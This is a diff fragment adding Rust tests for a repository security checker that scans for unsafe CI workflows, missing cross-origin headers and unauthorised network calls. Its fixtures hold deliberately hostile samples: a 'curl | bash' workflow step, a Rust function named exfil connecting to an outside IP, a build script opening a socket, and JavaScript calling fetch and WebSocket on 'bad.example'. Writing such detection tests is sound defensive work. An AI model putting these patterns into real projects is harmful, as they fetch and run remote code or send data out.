+            "name: CI\non: [workflow_dispatch]\npermissions:\n  contents: read\njobs:\n  g:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - uses: vmactions/freebsd-vm@v1\n        with:\n          prepare: echo ${{ github.head_ref }}\n          run: echo ${{ inputs.version }} ${{ github.ref_name }}\n      - run: curl -fsSL https://raw.githubusercontent.com/x/y/main/install.sh | bash\n",
+        );
+        let (_, wf_hits) = run_checks(&dir_wf.path).unwrap();
+        assert!(wf_hits.iter().any(|v| v.check == 4 && v.detail.contains("SHA")), "{wf_hits:?}");
+        assert!(wf_hits.iter().any(|v| v.check == 4 && v.detail.contains("inputs.*")), "{wf_hits:?}");
+        assert!(wf_hits.iter().any(|v| v.check == 4 && v.detail.contains("github.ref_name")), "{wf_hits:?}");
+        assert!(wf_hits.iter().any(|v| v.check == 4 && v.detail.contains("github.head_ref")), "{wf_hits:?}");
+        assert!(wf_hits.iter().any(|v| v.check == 4 && v.detail.contains("main")), "{wf_hits:?}");
+
+        // R2-S13-05: missing COOP/COEP
+        let dir_hdr = create_clean_fixture("r2-hdr");
+        dir_hdr.write(
+            "packaging/web/_headers",
+            "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n",
+        );
+        let (_, hdr_hits) = run_checks(&dir_hdr.path).unwrap();
+        assert!(hdr_hits.iter().any(|v| v.check == 5 && v.detail.contains("Cross-Origin-Opener-Policy")), "{hdr_hits:?}");
+        assert!(hdr_hits.iter().any(|v| v.check == 5 && v.detail.contains("Cross-Origin-Embedder-Policy")), "{hdr_hits:?}");
+
+        // R2-S13-06 & R2-S13-07: cfg(not(test)), per-fn loopback, build.rs, core::net, js_sys, web assets
+        let dir_net = create_clean_fixture("r2-net");
+        dir_net.write(
+            "crates/mcp/src/tools.rs",
+            "use std::net::{SocketAddr, TcpStream};\npub fn safe(port: u16) -> SocketAddr { SocketAddr::from(([127, 0, 0, 1], port)) }\npub fn exfil() { let _ = TcpStream::connect(\"198.51.100.1:443\"); }\n",
+        );
+        dir_net.write("crates/text/build.rs", "pub fn main() { let _ = std::net::TcpStream::connect(\"1.2.3.4:80\"); }\n");
+        dir_net.write(
+            "crates/core/src/prod_cfg.rs",
+            "#[cfg(all(unix, not(test)))]\npub fn f() { let _ = core::net::TcpStream::connect(\"1.2.3.4:80\"); }\n",
+        );
+        dir_net.write("crates/core/src/js.rs", "pub fn f() { let _ = js_sys::Reflect::get(&w, &\"fetch\".into()); }\n");
+        dir_net.write(
+            "crates/core/Cargo.toml",
+            "[package]\nname = \"lumencraft-core\"\n[dependencies]\nweb-sys = { version = \"0.3\", features = [\"Window\", \"WebSocket\"] }\n",
+        );
+        dir_net.write("apps/lumencraft-web/extra.js", "fetch ('https://bad.example/p'); const ws = new WebSocket('//bad.example/s');\n");
+        let (_, net_hits) = run_checks(&dir_net.path).unwrap();
+        assert!(net_hits.iter().any(|v| v.check == 1 && v.detail.contains("WebSocket")), "{net_hits:?}");
+        assert!(net_hits.iter().any(|v| v.check == 2 && v.path == "crates/mcp/src/tools.rs" && v.detail.contains("loopback")), "{net_hits:?}");
+        assert!(net_hits.iter().any(|v| v.check == 2 && v.path == "crates/text/build.rs"), "{net_hits:?}");
+        assert!(net_hits.iter().any(|v| v.check == 2 && v.path == "crates/core/src/prod_cfg.rs" && v.detail.contains("core::net")), "{net_hits:?}");
+        assert!(net_hits.iter().any(|v| v.check == 2 && v.path == "crates/core/src/js.rs" && v.detail.contains("fetch")), "{net_hits:?}");
+        assert!(net_hits.iter().any(|v| v.check == 3 && v.path == "apps/lumencraft-web/extra.js" && v.detail.contains("fetch")), "{net_hits:?}");
+        assert!(
+            net_hits.iter().any(|v| v.check == 3 && v.path == "apps/lumencraft-web/extra.js" && v.detail.contains("//bad.example")),
+            "{net_hits:?}"
+        );
     }
 }
